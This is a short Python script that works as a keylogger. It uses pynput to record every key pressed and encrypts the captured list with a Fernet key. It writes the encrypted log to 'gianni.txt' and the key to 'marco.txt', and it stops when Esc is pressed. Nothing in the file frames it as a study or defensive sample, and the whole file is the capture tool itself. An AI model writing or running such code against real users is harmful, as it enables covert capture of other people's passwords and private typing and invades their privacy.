from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet

arx = []

k = Fernet.generate_key()

fernet = Fernet(k)

with open("marco.txt", "wb") as f:
    f.write(k)

def wr_start(k):
    try:
        arx.append(k.char)
    except AttributeError:
        arx.append(str(k))

    scrivi(arx)

def scrivi(arx):
    with open("gianni.txt", "wb") as f:
        encrypted_keys = fernet.encrypt(bytes(str(arx), 'utf-8'))
        f.write(encrypted_keys)

def stop(k):
    if k == Key.esc:
        return False

with Listener(on_press=wr_start, on_release=stop) as listener:
    listener.join()